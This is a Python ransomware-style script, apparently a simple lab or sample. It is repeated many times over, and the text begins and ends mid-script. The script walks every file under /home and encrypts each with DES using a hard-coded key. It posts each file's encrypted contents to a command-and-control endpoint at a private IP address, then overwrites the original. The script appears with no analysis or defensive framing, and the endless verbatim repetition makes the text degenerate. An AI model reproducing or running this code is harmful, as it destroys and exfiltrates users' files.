            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
